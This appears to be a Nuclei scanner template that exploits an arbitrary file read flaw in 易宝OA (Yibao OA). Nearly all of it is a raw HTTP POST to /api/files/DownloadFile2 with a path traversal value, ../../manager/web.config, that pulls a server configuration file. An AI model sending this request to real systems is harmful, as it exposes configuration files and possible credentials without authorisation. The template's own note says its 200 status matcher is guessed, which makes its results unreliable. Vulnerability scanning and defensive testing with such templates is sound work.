id: poc-a25aa98a04571b6aa113
info:
  name: 易宝OAdownloadfile2任意文件读取漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: lfi,2025
http:
- raw:
  - 'POST /api/files/DownloadFile2 HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0

    Connection: close

    Content-Length: 94

    Accept-Encoding: gzip, deflate

    Content-Type: application/x-www-form-urlencoded


    token=zxh&requestFileName=../../manager/web.config&pathType=1&startPosition=0&bufferSize=1000'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
